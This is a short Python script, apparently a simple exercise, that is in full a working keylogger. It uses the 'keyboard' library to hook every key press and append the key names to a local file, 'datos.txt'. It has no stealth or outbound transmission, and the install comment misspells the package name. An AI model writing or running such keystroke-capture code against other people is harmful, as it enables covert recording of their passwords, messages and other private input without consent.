#pip install keboar
import keyboard 

def letraPresionada(key):
    with open('datos.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)
            
keyboard.on_press(letraPresionada)
keyboard.wait()

